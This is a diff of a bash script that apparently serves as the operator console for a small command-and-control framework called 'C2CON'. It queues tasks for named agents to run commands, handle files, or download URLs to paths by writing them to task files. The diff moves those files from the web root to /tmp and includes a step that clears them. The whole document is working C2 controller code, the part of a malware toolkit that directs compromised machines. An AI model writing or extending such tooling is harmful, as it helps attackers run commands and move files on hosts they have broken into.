@@ -11,7 +11,6 @@ echo """
  
                  Started from the bottom, we keep diggin
 """
-
 echo "Action ?"
 read action
 
@@ -20,8 +19,8 @@ echo "Agent ?"
 read agent
 echo "Ze Juice ?"
 read cmd
-echo "$agent:$action:$cmd" >> /var/www/html/cmds.txt
-echo "Task to $agent => $action $cmd" >> /var/www/html/res.txt
+echo "$agent:$action:$cmd" >> /tmp/C2CON-cmds.txt
+echo "Task to $agent => $action $cmd" >> /tmp/C2CON-res.txt
 sleep 2
 clear
 
@@ -30,8 +29,8 @@ echo "Agent ?"
 read agent
 echo "Ze File ?"
 read file
-echo "$agent:$action:$file" >> /var/www/html/cmds.txt
-echo "Task to $agent => $action $file" >> /var/www/html/res.txt
+echo "$agent:$action:$file" >> /tmp/C2CON-cmds.txt
+echo "Task to $agent => $action $file" >> /tmp/C2CON-res.txt
 sleep 2
 clear
 
@@ -43,8 +42,8 @@ echo "URL ?"
 read url
 echo "Path ?"
 read path
-echo "$agent:$action:$url:$path" >> /var/www/html/cmds.txt
-echo "Task to $agent => $action $file $url to $path" >> /var/www/html/res.txt
+echo "$agent:$action:$url:$path" >> /tmp/C2CON-cmds.txt
+echo "Task to $agent => $action $url to $path" >> /tmp/C2CON-res.txt
 sleep 2
 clear
 
@@ -54,14 +53,14 @@ echo "file?"
 read file
 
 if [ "$file" = "cmds" ]; then
-echo "" > /var/www/html/cmds.txt
+echo "" > /tmp/C2CON-cmds.txt
 sleep 2
 echo "Clearing cmds.txt"
 clear
 fi
 
 if [ "$file" = "res" ]; then
-echo "" > /var/www/html/res.txt
+echo "" > /tmp/C2CON-res.txt
 sleep 2
 echo "Clearing res.txt"
 clear
